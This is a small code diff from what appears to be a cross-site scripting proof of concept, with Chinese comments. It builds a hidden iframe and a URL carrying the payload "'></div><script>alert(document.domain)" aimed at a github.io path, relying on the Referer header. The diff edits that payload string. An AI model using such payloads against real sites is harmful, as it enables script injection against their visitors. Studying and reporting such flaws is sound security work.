@@ -11,7 +11,7 @@
         iframe.style.display = 'none';
 
         // 构造含 Payload 的 URL（需用户访问此页面）
-        const payload = encodeURIComponent("'></div><script>alert(document.domain)</script>");
+        const payload = encodeURIComponent("'></div><script>alert(document.domain)");
         const attackerUrl = `1u0hun.github.io/wenku/${payload}`; 
         
         // 确保 iframe 请求时 Referer 包含完整攻击 URL
